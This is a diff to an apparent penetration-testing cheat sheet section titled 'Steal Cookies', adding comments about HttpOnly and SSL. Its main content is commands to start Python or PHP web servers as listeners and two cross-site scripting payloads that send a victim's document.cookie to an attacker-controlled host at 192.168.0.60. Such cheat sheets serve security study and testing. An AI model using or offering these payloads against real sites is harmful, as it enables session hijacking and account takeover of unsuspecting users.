@@ -1,12 +1,13 @@
 Steal Cookies
 -----------------------
 ```
-# Use ruby SSL server for SSL connections
+# Will not work if HttpOnly is in cookie header (modern browsers will block this)
+# Use ruby SSL server or apache with SSL enabled for SSL connections
 # Start Python Web Server
 python -m SimpleHTTPServer 80
 # Start PHP Web Server
 php -S xxx.xxx.xxx.xxx:<port>
-
+# Attack Script
 <script>document.location="http://192.168.0.60/?c="+document.cookie;</script>
 <script>new Image().src="http://192.168.0.60/index.php?c="+document.cookie;</script>
 ```
